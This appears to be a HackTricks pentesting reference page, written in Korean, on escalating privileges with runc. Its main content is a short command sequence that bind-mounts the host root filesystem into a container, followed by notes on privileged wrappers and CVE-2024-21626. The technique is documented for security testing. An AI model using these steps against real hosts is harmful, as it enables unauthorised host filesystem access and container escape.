# RunC Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## 기본 정보

**runc**에 대해 더 알아보려면 다음 페이지를 확인하세요.

{{#ref}}
../../network-services-pentesting/2375-pentesting-docker.md
{{#endref}}

## PE

호스트에서 rootful 프로세스가 `runc`를 사용할 수 있다면, 마운트 설정이 호스트의 `/`를 컨테이너 내부의 `/`에 재귀적으로 bind-mount하는 OCI bundle을 사용해 해당 마운트 네임스페이스에서 호스트 파일 시스템에 접근할 수 있습니다.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

```bash
runc -help #Get help and see if runc is intalled
runc spec #This will create the config.json file in your current folder

Inside the "mounts" section of the create config.json add the following lines:
{
    "type": "bind",
    "source": "/",
    "destination": "/",
    "options": [
        "rbind",
        "rw",
        "rprivate"
    ]
},

#Once you have modified the config.json file, create the folder rootfs in the same directory
mkdir rootfs

# Finally, start the container
# The root folder is the one from the host
runc run demo
```

> [!CAUTION]
> 문서화된 `runc run` workflow는 rootful입니다. runc 자체 예시에서도 이를 "run as root"라고 표시합니다. 권한이 없는 사용자는 `runc spec --rootless`와 같은 rootless 구성이 필요하며, runc 문서에 따르면 이 모드에서는 user namespaces가 활성화되어 있어야 합니다.<sup>[[1]](#references)</sup>

## 권한 있는 wrapper와 runtime 버전

호출자가 제어하는 OCI bundle을 허용하는 권한 있는 wrapper는 안전하지 않은 bind mount를 허용할 경우 host 파일을 노출할 수 있습니다. wrapper가 mount source와 destination을 검증하기 전에 경로 순회와 symlink를 확인하는지, 그리고 `process.cwd`를 제한하는지 확인하세요. sudo 규칙이나 쓰기 가능한 `config.json`만으로는 wrapper가 해당 bundle을 허용하거나 host 권한으로 실행할 것이라고 단정할 수 없습니다.

별도로, [CVE-2024-21626](https://github.com/opencontainers/runc/security/advisories/GHSA-xr7r-f8xq-vfvv)은 upstream `runc` 버전 `1.0.0-rc93`부터 `1.1.11`까지에 영향을 미쳤으며, `1.1.12`에는 upstream 수정 사항이 포함되어 있습니다. leak된 file descriptor와 불충분한 working directory 검증으로 인해 특정 `runc run` 또는 `runc exec` workflow에서 container process가 root 바깥에 위치할 수 있었습니다. File descriptor 번호는 실행 방식에 따라 달라지며, vendor가 수정 사항을 backport했거나 호출자가 권한 있는 runtime 실행을 제어할 수 없는 경우 버전 문자열만으로는 악용 가능성을 입증할 수 없습니다.

## References

- [1] [runc: 컨테이너를 생성하고 실행하기 위한 CLI 도구](https://github.com/opencontainers/runc#using-runc)
- [2] [OCI Runtime Specification: Mounts](https://github.com/opencontainers/runtime-spec/blob/main/config.md#mounts)
- [3] [공유 서브트리](https://docs.kernel.org/filesystems/sharedsubtree.html)
{{#include ../../banners/hacktricks-training.md}}
